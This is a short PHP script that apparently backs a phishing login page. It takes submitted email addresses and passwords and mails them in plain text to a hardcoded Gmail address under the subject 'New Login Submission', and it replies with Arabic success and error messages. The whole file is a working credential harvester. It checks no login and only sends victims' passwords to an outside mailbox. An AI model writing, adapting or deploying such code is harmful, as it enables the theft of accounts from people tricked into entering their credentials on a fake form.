<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? 'Not provided';
    $password = $_POST['password'] ?? 'Not provided';

    $to = "bebocurrency@gmail.com";
    $subject = "New Login Submission";
    $message = "Email: $email\nPassword: $password";
    $headers = "From: no-reply@yourdomain.com";

    if (mail($to, $subject, $message, $headers)) {
        echo "تم الإرسال بنجاح!";
    } else {
        echo "حدث خطأ أثناء الإرسال.";
    }
} else {
    echo "الطلب غير صالح.";
}
?>
